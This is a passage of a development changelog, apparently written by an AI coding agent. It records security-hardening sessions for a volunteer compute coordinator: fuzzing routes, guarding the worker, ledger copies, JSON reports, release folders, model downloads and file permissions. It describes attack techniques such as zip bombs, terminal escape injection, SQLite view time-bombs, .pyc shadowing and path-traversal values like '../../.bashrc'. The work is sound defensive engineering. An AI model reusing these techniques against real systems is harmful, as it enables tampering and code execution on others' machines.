+  - I broke things 12 ways on purpose (removed each footer link, slipped in "Presale is live!" and "To the moon", hype in the share-card description, a Telegram link, removed the "no coin" line, an image without alt text, a broken share card, risky code in nav.js, dropped the page from the live check). All were caught, but two only after I sharpened the tests: the "no coin" line also lived in the share-card text, and the FAQ link hid a missing footer link.
+- **Honest limits:** a word list can't catch every hype claim, only the common ones; it's a safety net, not an editor. The page is advice, not protection: it only helps people who read it. If you have your own Stay Safe draft, it can replace this one (USER_TODO).
+
+**What you learned**
+1. **Scammers move first.** A recognisable name with no real coin yet is the perfect bait: fake presales and "airdrops" can't be compared against anything real, so a page saying "none of this exists" is the comparison.
+2. **Rules beat logos.** Logos and screenshots are easy to copy. "We never DM first and never ask for your recovery phrase" can't be faked, because the scam needs to break it.
+3. **The recovery phrase is the wallet.** Whoever has those 12 or 24 words owns the money; no real support person ever needs them.
+4. **Report security holes quietly.** Posting the details publicly helps attackers before it's fixed; that's why the page asks for an issue with no details (and why turning on GitHub's private reporting is on your list).
+
+## 2026-11-24 (12:30 UTC): Throwing junk at every door of the coordinator, and the five things that broke (0.5.52)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. "Code audit" was open, and the cheapest useful first step needs nobody's decision: send every API route broken and hostile input and see what crashes. Before strangers can reach the coordinator, it should refuse bad requests politely instead of falling over.
+
+**Shipped (`input-limits-v1`)**
+- **A fuzz of every route** (`tests/test_input_limits.py`). With valid operator, submitter and worker logins, each route gets odd path segments (`%00`, `../`, 5,000 letters), odd query values, 11 broken bodies (empty, `null`, `1e999`, cut-off JSON, 3,000 brackets, invalid bytes) and 19 hostile values in each field of a valid example (huge and negative numbers, NUL, newlines, right-to-left marks, 10,000 letters, SQL-looking text, lists, objects): about 1,000 requests. The rule: refusing is fine, crashing (`5xx`) or showing a stack trace is not. A new route or request type without an example makes it fail, so it can't quietly go stale.
+- **What it found, and the fixes:**
+  1. **No size limit on what you send.** Anyone, no login needed, could send a 1 GB body and the coordinator read all of it into memory before saying "too long". Now anything over **256 KiB** (`MAX_BODY_BYTES`) gets `413 Payload Too Large`: straight away if the request says its size up front (not one byte read), or the moment a request that doesn't say its size passes the limit. The biggest honest request is about 150 KB, so nothing real is affected.
+  2. **Nested brackets crashed the request.** `[[[[...` 5,000 deep made Python's JSON reader give up with a `500` and a stack trace in the log. Now anything nested deeper than 32 levels gets `400` before it's read as JSON. Real requests nest at most 2 deep.
+  3. **Error messages repeated what you sent.** When a field was wrong, the `422` reply quoted it back: a secret pasted into the wrong box, or a 4 MB string. And `1e999` (which Python reads as infinity) couldn't be written back out, so the error message itself crashed into a `500`. Errors now say only what was wrong and where.
+  4. **Numbers too big for the database.** Asking for a reward report "until 2^70" crashed SQLite (`OverflowError`). Dates are now limited to 0 through 2^53 (about 285,000 years from now).
+  5. **A worker could claim it started a job before time began.** `started_at = -2^70` was accepted. Now 0 or later.
+  - Also: **worker names are plain** (3-80 of letters, digits, `. _ : -`), so a name can't sneak a newline, an invisible character or HTML into logs, reports or pages; **capability lists** are at most 16 short lowercase names.
+- **Refused requests still count.** The new check runs inside the request logger and the per-address speed limit, so a flood of oversized requests still gets logged (path and status only, never the body) and still gets slowed down with `429`.
+- **Proof.**
+  - 38 new tests, **1,063 total, all passing** (Python 3.13, installed from the hash-checked lock; one release test is skipped until the work is committed, as designed).
+  - Checked on a real web server (uvicorn), not just the test client: a 1 MB body got `413`, the same 1 MB sent without a size got `413`, 5,000-deep brackets got `400`, `/health` stayed `200`, no stack trace in the log.
+  - I switched each fix off on purpose, 13 ways (no up-front size check, no cut-off while reading, off-by-one at the limit, no depth check, counting brackets inside text, echoing input, no error handler, unbounded report dates, negative start times, unlimited capabilities, any worker name...). 11 were caught at once. The other 2 slipped past: the up-front size check (the cut-off while reading covered for it, so I added a test that fails if even one byte is read), and one report date (my break hit `since`, which another check already covers; breaking `until` was caught).
+- **Honest limits:** a fuzz only finds what it tries. It checks single requests, not a client that sends one byte a minute (the web server's timeouts handle that) or a flood from thousands of addresses (needs a protected host before going public, threat model #17). It's a first pass of the code audit, not the audit.
+
+**What you learned**
+1. **Check the size before you read.** A server that reads the whole request and *then* checks it has already spent the memory. The `Content-Length` header lets it say no first; for requests without one, it counts as it reads and stops at the limit.
+2. **Fuzzing is throwing junk on purpose.** Instead of guessing which bad input matters, send lots of kinds to every door and only ask "did anything crash?". It found 5 problems no one had written a test for.
+3. **Error messages can leak.** Repeating someone's input back is friendly for debugging, but it can repeat a secret or a huge payload. Saying *where* the problem is ("body → enrollment_code: wrong type") is enough.
+4. **Computers have number limits.** Python can handle any size of whole number, but SQLite stops at about 9.2 quintillion (2^63). Passing a bigger one across that border crashes unless something checks first.
+
+## 2026-11-24 (13:20 UTC): Turning the junk test around: a fake coordinator against the worker (0.5.53)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. Last session threw junk at the coordinator; this session does the same to the **worker**, which matters more for your volunteers: the worker runs on *their* machine, and it talks to whatever answers at the address it was given. A typo, a fake "official coordinator" link, or someone on the same Wi-Fi could be on the other end.
+
+**Shipped (`worker-input-v1`)**
+- **New `app/worker_guard.py`**, used for every request `demo_worker.py` makes. Before, the worker trusted every reply's *shape* (it already checked job signatures, so it never *ran* a fake job, but it could be knocked over before it got that far). What I found and fixed:
+  1. **No size limit on replies.** A fake coordinator could send 5 GB and the worker would try to hold it all in memory. Now replies over **8 MiB** are refused: before reading a byte if the reply says its size, otherwise the moment it passes 8 MiB. (The biggest honest reply is about 4 MiB.)
+  2. **Zip bombs.** The worker let httpx unpack compressed replies; 50 KB of gzip can unpack to 50 MB, and 1 MB to 1 GB. Now it asks for an uncompressed reply and refuses any compressed one.
+  3. **Slow drip.** The old 10-second timeout was *per read*, so one byte every 9 seconds kept the worker waiting for ever. Now the whole reply must arrive within **60 seconds**.
+  4. **Crashes on broken JSON.** HTML instead of JSON, 200,000 `[` in a row, `NaN`, a 6,000-digit number, bad bytes, or a list where a job should be: all crashed the worker with a stack trace. Now each is a one-line "Stopped: ..." message.
+  5. **Terminal tricks.** The worker printed the coordinator's error messages and a refused job's id exactly as sent. Hidden codes in that text can clear the owner's screen, change the window title, draw a fake `root@rig:~#` prompt, or flip text right-to-left. Now every bit of coordinator text is printed with those characters turned into `?`, cut to 200 characters.
+  6. **Any reply saved as the key.** On enrolment the worker saved whatever came back as its key, newlines and all. Now it must look exactly like a real key (`bnhw_` plus 32-128 safe characters) or nothing is saved.
+  7. **Job ids in the URL.** The worker puts the job id into the submit address. An id like `../workers/register` (even one signed with a stolen key) could point that somewhere else. Now job ids are letters, digits, `_` and `-` only.
+  8. **Spinning.** Handed nothing but bad jobs, the worker asked again instantly, as fast as the network allowed. Now it waits 5, 10, 20, 40, then 60 seconds between tries.
+  9. **Key over plain http.** Signatures protect the *jobs*, but the worker's key goes with every request. Over `http://` to another computer, anyone on the network can read it and pretend to be that rig. Now `http://` is only allowed to the same machine (`127.0.0.1`, `localhost`); anything else needs `https://`, or `--allow-plain-http` for a test lab you control. (Added to your to-do list as "good to know".)
+- **Proof.**
+  - 103 new tests, **1,166 total: 1,165 passing, 1 skipped** (the release test that only runs once the work is committed, as designed). The fuzz sends 16 kinds of hostile reply to each worker step (fetching the coordinator key, enrolling, claiming a job) and replaces each field of a signed job with 15 hostile values. The rule: stop cleanly or carry on; never crash, never print a control character, never pin, save or run anything hostile. An honest job still runs and is submitted.
+  - Checked against a **real hostile web server** on a real network socket, not just a simulation: an endless reply was cut off at 8 MiB (the server got 12 MiB out before the worker hung up), a reply claiming 5 GiB was refused at once, a gzip bomb was refused, and a one-byte-every-half-second drip was given up at the deadline.
+  - I broke the guards 21 ways on purpose (removed each size, time, depth, `NaN`, encoding and shape check, followed redirects, printed raw text, let plain http through, removed the wait...). **20 were caught.** The one that slipped past: printing the submit reply raw. That turned out to be safe anyway, because Python already escapes control codes when it prints a whole dictionary, so that guard is a second layer.
+- **Honest limits:** this protects the worker from bad *replies*, not from a coordinator that signs bad jobs with the real key (the coordinator is trusted; signature, model-pin and hash checks are unchanged). A server that drips its *headers* (not the body) slowly is still only limited by the 10-second-per-read timeout. Only the worker uses these guards; the operator's own tools talk to your own coordinator.
+
+**What you learned**
+1. **Both ends of a connection need guards.** Last session made the coordinator safe from bad workers. A worker on a volunteer's PC has to be just as careful, because "the coordinator" is simply whoever answers at that address.
+2. **A signature checks the message, not the delivery.** Signed jobs couldn't be faked before either, but a reply can still be huge, slow or malformed *before* the signature is ever checked. Limits come first, then the signature.
+3. **Text can be a weapon in a terminal.** The `ESC` character starts hidden commands for the terminal (colours, clear screen, window title). Printing a stranger's text without removing them is like pasting it into the terminal's settings.
+4. **http vs https.** With `http://` anyone between the two computers (same Wi-Fi, the router, the internet provider) can read and change everything sent, including passwords and keys. `https://` encrypts it. On one machine (`127.0.0.1`) nothing travels over the network, so http is fine there.
+
+## 2026-11-24 (14:35 UTC): A ledger copy is a file from a stranger, so check it like one (0.5.54)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last two sessions threw junk at the coordinator and at the worker. This one turns to the third thing strangers touch: the **ledger copies** we publish on `/reports/` and tell everyone to download and re-check. Our checking tools opened those files like any trusted database. But a SQLite file can carry more than rows, and the person running the check is a volunteer, maybe on a copy from a fake mirror or a pull request.
+
+**Shipped (`copy-open-v1`)**
+- **New `prototype/app/copy_guard.py`**, run before any of our code reads a copy. What I found and fixed:
+  1. **A "time-bomb" copy passed verification.** A table inside the file can be swapped for a *view*, which is a small program. I built a copy whose `submissions` view shows the honest points until a date and adds 1,000 after it. Our `verify` said it matched the signed report perfectly. The same kind of file with a date in the past failed. Same bytes, same sha256, different numbers depending on the reader's clock. Now views (and triggers, and virtual tables) are refused, and a copy must have exactly the tables, columns and indexes that `ledger_copy export` writes.
+  2. **Checking a copy could change it.** If a half-finished write left a `-journal` file next to a copy, a normal open "repairs" the copy from it, rewriting the file on your disk, so its sha256 no longer matches the published one. Shown in a test. Now copies are opened read-only *and* "immutable": SQLite ignores anything next to the file and never writes or creates a file.
+  3. **Quiet damage.** An index can disagree with its table while every page still looks fine; a lookup and a full scan then give different answers. Now `integrity_check` must say `ok`, and every row is read once up front.
+  4. **Size and time.** Files over 512 MiB, single values over 1 MiB and anything that isn't a SQLite file are refused before SQLite parses them; every connection is stopped after 5 minutes.
+  5. **Crashes.** An empty `copy_info` table crashed with a `TypeError`, and a junk file printed a Python traceback from `ledger_copy info`. Now every tool prints one line ("refusing to read ...") and exits with code 2.
+- **Used by** `rewards verify --db`, `ledger_copy compare` and `info`, and `publish_report add|check`. Your own export runs the same check on its output before saving, so an honest copy can never be one the tools refuse. Your live ledger (the operator's own tools) is opened exactly as before.
+- **Proof.**
+  - 28 new tests, **1,194 total: 1,193 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and on Python 3.11 (what CI uses, with an older SQLite and without one of the extra switches).
+  - I broke the guard 19 ways on purpose. **12 were caught by my first tests; the other 7 only after I added tests** (e.g. turning off the "immutable" open slipped past until I added a copy in WAL format, which a normal read-only open quietly adds two files beside). The tests also caught a real bug in the guard: the size limit was frozen when the module loaded.
+- **Honest limits:** this makes *reading* a copy safe; it doesn't make the numbers true (the signature, the consistency checks and `compare` do that). It can't protect against a bug inside SQLite itself, so keep Python updated. Nothing is published yet, so nobody has run into this; the point was to fix it before the first period goes up.
+
+**What you learned**
+1. **A database file can contain code.** A "view" looks like a table but runs a query every time it's read. That's handy in your own database and dangerous in someone else's.
+2. **Same hash, different meaning.** A sha256 proves the bytes didn't change. It doesn't prove the bytes mean the same thing tomorrow, if they contain code that looks at the date.
+3. **Opening can be writing.** SQLite "fixes" a file on open if it finds a leftover journal. For evidence files, open read-only and immutable so the evidence stays exactly as published.
+4. **Allow-list, don't block-list.** Instead of listing every bad thing a file might hold, the guard says what a good copy looks like (these tables, these columns, nothing else) and refuses everything else.
+
+## 2026-11-24 (15:30 UTC): The files people download to check us were trusted too much (0.5.55)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last three sessions hardened the coordinator, the worker and the ledger-copy reader against hostile input. One kind of stranger's file was left: the **JSON** ones. Volunteers will download a signed report from `/reports/` (or from a mirror, a chat, a pull request) and check it; rigs will check a release's file list and signatures before running the worker; and CI re-checks `reports/index.json` (the file the logbook page displays) on every pull request, including ones from strangers.
+
+**Shipped (`json-file-v1`)**
+- **A real hole, found and fixed: a borrowed fingerprint passed the check.** A signed report carries a short `fingerprint` next to its signature, like `38b8-bc7b-c882-2bb5`, for people to compare with the coordinator's. That field isn't part of what's signed; it's only a label. `rewards verify --no-db` printed the label from the file. So I made a report with 1,000,000 points, signed it with my *own* key, pasted the real coordinator's fingerprint into the label, and the tool said "signed by 38b8-bc7b-c882-2bb5 ... OK". Anyone comparing fingerprints, as the tool told them to, would have been fooled. Now the label must belong to the key that actually signed (otherwise `MISMATCH`), and the tool prints the fingerprint it works out itself. The `/reports/` page already told people to pass `--public-key`, which always caught it.
+- **A second one: the page's numbers were never checked.** The logbook page shows rigs, results, simulated points, scoring version and fingerprints from `index.json`. The CI check compared file hashes only. So a pull request that changed "points: 120" to "points: 1,000,000" in `index.json` would have passed CI and gone live. Now CI checks every value the page shows against the signed report, the coordinator line against the key that signed the newest period, each file size, and "history unchanged". Entries can only hold the fields our tool writes and can only point at their own two files (it used to follow any path, even `/etc/passwd`).
+- **New `prototype/app/json_file.py`**, used by all three tools (`rewards verify`, `release verify`, `publish_report`). It refuses: something that isn't a normal file (a "named pipe" made the tool hang for ever; `/dev/zero` filled memory); files over 4 MiB (reports 64 MiB), before reading and again while reading; text that isn't UTF-8; brackets nested more than 32 deep (100,000 of them crashed the tools); `NaN` and `Infinity`; and **the same key twice** in one object.
+- **No more crashes**: a list, `null` or wrong shapes inside a report now give `MISMATCH` or a one-line "refusing to read it" instead of a Python traceback.
+- **A small catch everywhere:** in Python, the pattern `^abc$` also matches `"abc"` followed by a line break. 18 patterns in the code used `$`; they now use `\Z` (true end of text). One of them decided whether a value was written into the log as-is, so a value ending in a line break could add a line to the log. A test now fails if anyone adds a `$` pattern again.
+- **Proof.**
+  - 59 new tests, **1,253 total: 1,252 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and 3.11 (what CI uses). The CI steps (lock, licenses, workflow pins, reports check, site and accessibility checks) all pass.
+  - I broke the new checks 31 ways on purpose. **30 were caught** (5 only after I added tests). The one that slipped past: printing the file's label instead of the computed fingerprint. That can't show anything different anymore, because the label is refused unless it matches; it's a second layer.
+- **Honest limits:** this makes reading these files safe and makes the page match the signed files. It doesn't make a report *true* (the signature and re-checks do that), and you still need the coordinator's key from a place you trust. Nothing is published yet, so nobody was fooled; the point was to close it before the first period goes up.
+
+**What you learned**
+1. **Not everything next to a signature is signed.** A signature covers exact fields. Anything else in the file, even a field *about* the signature, can be changed freely. Tools should only show what they checked or computed themselves.
+2. **Check what people see, not just the files.** Hashes proved the downloads were intact, but the page displayed numbers from a different file that nobody compared. Every value on a page needs a check behind it.
+3. **Duplicate keys are a trick.** `{"points": 1, "points": 9999}` is "valid-ish" JSON. Python reads the last one; some programs read the first. Refusing duplicates means everyone reads the same thing.
+4. **`$` isn't quite "the end".** In Python regular expressions, `$` also allows one line break at the end. `\Z` means the real end. Small, but line breaks are exactly what attackers use to fake extra log lines or names.
+
+## 2026-11-24 (16:15 UTC): The hardware check trusted the files a rig sends in (0.5.56)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The last four sessions hardened everything strangers touch: the coordinator, the worker, ledger copies and the JSON reports. One reader was left: `phase3_check`, the tool that turns a rig's inventory and test-run files into the hardware checklist. Today those files come from your rig; later, from volunteers ("evidence gets strong when someone else repeats the run"). So they are files from strangers too.
+
+**Shipped (`rig-report-v1`)**
+- **A real hole, found and fixed: the text "false" counted as true.** The checker asked "did the run exit cleanly?" with `if not exit_ok`. In Python any non-empty text counts as *true*, including the word `"false"`. I took an honest run, set the exit code to 1 and wrote `"exit_ok": "false"` (in quotes, as text, which is an easy slip when editing by hand): the old checker counted it as a **passing** smoke test. Same with `"target_card_busy": "false"`: a card that never did the work counted as busy. Now every yes/no field must be a real `true` or `false`.
+- **Crashes fixed:** a temperature written as a 400-digit number crashed the printout; `"readings": null` crashed it; an AMD card listed without a slot, or a render node without a name, crashed it. Now they're refused with one line, or shown as `?`.
+- **Terminal tricks:** the OS, kernel, card and driver names were printed exactly as written, so hidden codes in them could clear your screen or fake a prompt (same trick as session 0.5.53). Names must now be plain printable text, at most 200 characters, and every printed line and file name is cleaned as a second layer.
+- **Reading:** the files go through the same safe reader as reports (`app/json_file.py`): normal files only (a named pipe made it hang), at most 4 MiB (honest ones are 5-100 KB), no nesting tricks, no `NaN`, no key written twice.
+- **How it works:** two lists in `app/phase3_check.py` (`INVENTORY_SPEC`, `RUN_SPEC`) name every field the checker reads and its type. A missing field is fine (the checklist just finds less evidence, as before); a wrong type is refused with one line naming the file and the field (exit code 2).
+- **A second find, elsewhere:** the safe reader from last session (and the worker's) refused `NaN` and `Infinity`, but `1e400` (a 1 followed by 400 zeros, written short) quietly became *infinity*. Both now refuse any number too big for the computer to hold.
+- **Proof.**
+  - 675 new tests, **1,928 total: 1,927 passing, 1 skipped** (the release test that only runs on a committed tree, as designed). Run on Python 3.13 and on 3.11 (what CI uses).
+  - The tests take honest files made by the real recording tools, then replace **every field the checker reads with every wrong kind of value** (about 600 cases: text for numbers, `"false"` for false, lists for objects, 400-digit numbers, hidden terminal codes, invisible characters...). Each must be refused with one clean line. Then every field is deleted or set to `null` one at a time: no crash allowed.
+  - A "tracing" test watches which fields the checker actually reads and fails if it ever reads one the lists don't type-check. So if someone teaches the checker something new later, they can't forget the safety check.
+  - Shown against the old code: the edited crashed run passed, the 400-digit temperature crashed it.
+  - I broke the new checks 23 ways on purpose. **23 were caught** (one only after I added a test for the saved `--out` file; one break changed nothing because that check was redundant, so I removed it).
+- **Honest limits:** the rig files are still unsigned. This catches mistakes, sloppy edits and hostile files, not a careful forger who writes the right types; a repeat on someone else's rig is what makes them evidence. Still never run on real rig output.
+
+**What you learned**
+1. **"false" in quotes is not false.** `false` (no quotes) is a yes/no value; `"false"` (in quotes) is five letters of text. Many languages, Python included, treat any non-empty text as "yes". Checking the *type*, not just the value, closes that.
+2. **Allow-list the fields you read.** Instead of guessing what a bad file might contain, write down exactly which fields the tool uses and what each must be. Everything the tool touches is checked; everything else is ignored.
+3. **A test can watch the code read.** Wrapping the data so it records every field looked up lets a test prove "nothing is read without being checked first", even after future changes.
+4. **Computers have a biggest number.** A normal decimal number tops out near 1.8 × 10^308. Write `1e400` and many readers silently turn it into "infinity", which then breaks maths and comparisons in odd ways. Refuse it at the door.
+
+## 2026-11-24 (17:30 UTC): The release check looked for the wrong kind of file (0.5.57)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session continued the "code audit" item. The Stay Safe page tells people: before you run a download, check it with `python -m app.release verify ... --root .`. That makes the folder being checked a gift from a stranger. I went looking for ways to sneak code past it.
+
+**Found: three ways to get code past the check, all shown really running**
+1. **A compiled file next to the code.** Python can run `.pyc` files (compiled Python) with no `.py` beside them. Drop a `json.pyc` into the folder and, because `python -m` looks in the folder first, it is loaded instead of Python's own `json`. The check skipped every `.pyc` file. Same for `.so` files (compiled C), which it called "extra files, not code".
+2. **A cache file posing as the real one.** Python keeps compiled copies in `__pycache__` folders and trusts one if its label says "made from a file with this date and this size". A download can carry any date. I made a cache with the real `worker.py`'s date and size but other code inside: the signed `worker.py` checked out perfectly, and Python ran the cache instead. The check skipped `__pycache__` entirely.
+3. **A shortcut (link) named like a module.** A link called `json` pointing to a folder elsewhere. The check didn't look behind links; Python does.
+In all three, `verify` printed **OK** and then starting the worker printed `EVIL CODE RAN`.
+
+**Shipped (`release-folder-v1`)**
+- **Anything Python could load that isn't in the signed release now fails the check**: every file ending Python can import (the test asks Python itself for its list), links, and any folder the check can't read (it used to skip those silently).
+- **Caches are checked instead of skipped.** A cache passes only if it is *exactly*, byte for byte, what this copy of Python would build from the already-checked source file. The check never opens a cache up to look inside (that unpacking step isn't safe on hostile files); it builds its own and compares.
+- **The fix for any cache problem is always the same and always safe:** delete the `__pycache__` folders and run the check again. Python rebuilds them from the checked source.
+- Smaller things: listed files are opened without following links or hanging on pipes, and never read past their signed size; file names with hidden terminal codes or broken characters can't mess up the printout; a version number with hidden spaces or line breaks is refused.
+- **Proof.**
+  - 53 new tests, **1,983 total: 1,981 passing, 2 skipped** (the release test that only runs on a committed tree, and the real unreadable-folder test, which can't work as the all-powerful root user; I ran it separately as an ordinary user and it passed). Run on Python 3.13 and 3.11 (what CI uses).
+  - Each of the three holes has a test that first shows the planted code really runs, then that the check now catches it. 47 of the new tests fail against the old code.
+  - Honest caches made by Python itself pass, in every flavour Python can write.
+  - I broke the new checks 17 ways on purpose; all 17 were caught. Two earlier attempts showed two checks were redundant (the read was already limited), so I removed them.
+  - Dogfood: I made a throwaway release of this repo's own `prototype/` folder, signed it with two throwaway keys and checked it. The first try failed on 31 caches left by a Python 3.11 test run (exactly as designed: it can't compare another version's caches). After deleting those, it passed with 42 caches Python had built itself.
+- **Honest limits:** it checks the folder at the moment you run it. It covers what Python loads from the release folder, not your installed packages (the lock file's hashes cover those), llama.cpp or model files. `data/`, `venv` and `node_modules` are still skipped. No signed release exists yet; choosing signers is still your step.
+
+**What you learned**
+1. **Python runs more than `.py` files.** It also runs compiled `.pyc` files and `.so` libraries, and it will follow links. A check that only looks for `.py` files is checking the wrong thing.
+2. **Caches are trusted by their label.** A cache file says "I was made from a file of this size, saved at this time". Python believes the label. Labels can lie, so the check now rebuilds the cache itself and compares every byte.
+3. **"Where does Python look first?"** `python -m` searches the current folder before its own built-in modules, so a file named like a built-in (`json`, `hashlib`) in that folder wins. This is called *shadowing*.
+4. **A silent skip is a hole.** If a checker can't read a folder and just moves on, that folder is the perfect hiding place. Now "can't read it" means "can't vouch for it", and the check fails.
+
+## 2026-11-24 (18:30 UTC): The model download trusted whatever the internet sent (0.5.58)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions. The next thing you'll actually do on the rig, once llama.cpp builds, is download the first AI model (~400 MB) and "pin" it. That download is the one place where our code takes a big file straight from the internet, so this session's "code audit" pass looked at it.
+
+**Found, shown really happening** (with a small HTTPS server on this machine pretending to be a bad mirror)
+1. **No size limit and no time limit.** A server that never stops sending: the old download wrote **2.5 GB in 6 seconds** and would have kept going until the disk was full.
+2. **Redirects anywhere, even to plain http.** The server said "the file moved to `http://...`" (no encryption, so anyone on the network could swap it). The old code followed it and wrote **3.2 GB in 6 seconds**.
+3. **The first download was checked against nothing,** and `pin` then recorded whatever had arrived as the trusted fingerprint. Whoever controlled the download on day one would have controlled the pin.
+4. **Smaller ones:** a planted shortcut (link) named `<model>.gguf.part` made the download write into another file; a finished download silently replaced a file already there; the registry's file name was used unchecked (`../../.bashrc` would have pointed outside the models folder); a missing field crashed it with a traceback; a typo like `sha265` silently left a model unpinned; `pin` quietly changed an existing pin; a named pipe given as "the model" hung it.
+
+**Shipped (`model-fetch-v1`)**
+- **Limits on the download:** https only (redirects too, at most 5), no compressed replies, a size cap (the pinned size, or twice the registry's estimate: 800 MB for the Qwen model), a 60-minute overall limit, a free-disk-space check first, and a reply that ends early is refused.
+- **Checked against the model page:** `--expect-sha256` takes the fingerprint Hugging Face shows for the file. The download checks it while writing and deletes a file that doesn't match. Without it, the download prints **NOT CHECKED** in capitals. `pin` from the command line now needs that fingerprint (or you must say `--no-expected-hash` on purpose), and won't change an existing pin unless you add `--replace`.
+- **Files on disk:** downloads go into a fresh, randomly named temporary file and are only moved into place if every check passed and nothing of that name exists already. If the model is already there and matches the pin, nothing is downloaded.
+- **The registry:** every field is checked; a broken registry gives one plain line, and the worker simply stops offering AI jobs instead of crashing. Pins are written all-or-nothing (a crash leaves the old file).
+- **Proof.**
+  - 100 new tests, **2,083 total: 2,082 passing, 1 skipped** (one that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses).
+  - The tests play back every bad-server trick above through a fake network (no real downloads).
+  - I broke the new checks 25 ways on purpose; **all 25 were caught.**
+  - The same local HTTPS server against the new code: the http redirect was refused before a single byte, the endless reply stopped at 64 MB, nothing was left on disk. A real 5 MB test file: downloaded and checked, a wrong fingerprint refused and deleted, pinned, a second download skipped ("already here"), `verify` OK.
+- **Honest limits:** a fingerprint from the model page proves the file wasn't changed *on the way*, not that the publisher's model is honest. No real model was downloaded (this sandbox can't reach Hugging Face). Someone who can already write to your models folder could still swap the file between the worker's check and llama.cpp opening it.
+- **New step for you** is in USER_TODO ("download and pin the first model"): copy the SHA256 from the file's page on Hugging Face and pass it to both commands.
+
+**What you learned**
+1. **A download is a conversation with a stranger.** The server decides how big the file is, how long it takes and where to send you next. Good download code sets its own limits instead of trusting the server's.
+2. **"Trust on first use" is only as good as the first use.** Pinning records a fingerprint so later copies can be checked, but if the very first copy was bad, the pin protects the bad file. Checking against a fingerprint published somewhere else (the model page) closes that gap.
+3. **A redirect can downgrade you.** https is encrypted; plain http is not. If the code follows a "moved to http://..." redirect, the encryption you started with is gone. Each hop has to be checked, not just the first address.
+4. **Write to a new file, then swap it in.** Writing straight into the final name (or a predictable temp name) lets a crash leave half a file, or a planted link redirect the write. A fresh random temp file, moved into place only when finished, avoids both.
+
+## 2026-11-24 (19:30 UTC): Other people on the same computer could read the hidden-test answers (0.5.59)
+
+**Why this, why now.** PR #5 has green CI and no merge conflicts (GitHub's "blocked" just means it's waiting for your review). Every GPU item left needs the rig or one of your decisions, so this session did the eighth "code audit" pass. Earlier passes looked at what comes in from outside (the network, files from strangers, downloads). This one looked at the files our own programs leave on the computer they run on, and asked: **who else on that computer can read or change them?**
+
+**Found, shown really happening** (this sandbox has a second, ordinary account called `nobody`; I ran commands as that account)
+1. **The ledger was readable by everyone.** The coordinator's database (`data/prototype.sqlite3`) holds the **expected answer of every hidden test**, who each test is aimed at, job inputs and key fingerprints. It was created with the computer's usual setting, "everyone may read". As `nobody`, I copied it and printed a hidden test's answer. Anyone else with an account on the coordinator's computer could have done the same, then passed every hidden test.
+2. **The worker didn't check its own key file.** If `worker-<id>.key` was readable by others (easy to do by copying it from another computer), the worker used it anyway. The coordinator's signing key already had this check; the worker's key didn't.
+3. **The pinned coordinator key could be swapped.** The worker trusts the key in `data/coordinator.pub`. If that sat in a folder anyone can write to, another user could delete it and put their own coordinator's key there, and the worker would trust their coordinator. (Replayed in the tests.)
+4. **A "pipe" instead of a key file froze things forever.** A named pipe is a special file that waits for someone to write into it. Put one where the worker key, a pinned key or the signing key should be, and the worker or coordinator hung. Also, the signing key's "only you can read it" check looked at the file, then opened it again by name, leaving a moment where it could be swapped.
+
+**Shipped (`secret-file-v1`)**
+- **One place for the rules:** new `app/secret_file.py`.
+- **The ledger is now private:** the coordinator makes the `data/` folder owner-only and creates an empty owner-only ledger before the database engine touches it, so the database's helper files come out private too. The same `nobody` test now gets **Permission denied**. An older ledger that others can read makes the coordinator stop and print the exact fix (`chmod 600 ...`).
+- **The worker checks its files** before sending its key anywhere: the key must not be readable by others, pinned keys must not be changeable by others (file or folder), and each must actually hold a key. Each problem is one plain line with the fix.
+- **Every key and pin file** is opened once without waiting, then checked on that same open file: a normal file, yours, small. New ones are created private and never written over an existing file or through a planted shortcut (link).
+- **Nothing changes for an ordinary setup:** an existing `data/` folder that only you can change keeps working and is never modified.
+- **Proof.**
+  - 41 new tests, **2,124 total: 2,123 passing, 1 skipped** (the one test that can't work as the all-powerful root user, as designed). Run on Python 3.13 and 3.11 (what CI uses). The real second-account test runs here (as root) and is skipped in CI, which doesn't run as root.
+  - **18 of the new tests fail on the old code**, including the real `nobody` one, which printed the hidden answer.
+  - I broke the new checks 20 ways on purpose; **19 were caught.** The one not caught: writing a pin straight into the file instead of writing a new one and swapping it in. That only differs if the computer crashes halfway through writing, which a test can't easily do; noted honestly.
+  - Five older tests made their test files with "everyone may read" and now fail the new checks (correctly), so they now make them private.
+- **Honest limits:** this protects against *other accounts* on the same computer and against mistakes. The administrator (root), or anything running as your own account, can still read everything. On Windows only the "normal file, not too big" checks apply. The offline handover key's folder isn't checked, because it may sit on a USB stick. No coordinator is running anywhere yet, so nothing needs fixing on your side.
+
+**What you learned**
+1. **Every file has three sets of permissions:** for you (the owner), for your group, and for everyone else. `chmod 600 file` means "only I can read and write it". `chmod 700 folder` means "only I can enter or change this folder". Numbers like `644` mean "I can write, everyone can read".
+2. **Programs inherit a default.** Unless a program asks for something else, new files usually come out as `644`, readable by everyone. A database full of secrets needs the program to ask for `600` explicitly, before the file is first made.
+3. **The folder matters as much as the file.** If others can change a folder, they can't edit your file, but they can delete it and put their own file with the same name in its place. That's why the checks look at the folder too.
+4. **Check the thing you actually opened.** "Look at the file, then open it" leaves a gap where the file can be swapped. Opening it first and then checking that open file closes the gap. (Same idea as the model download fix earlier today: check what you really got.)
+
+## 2026-11-24 (20:30 UTC): Your own tools would hand the master password to a wrong address (0.5.60)
+
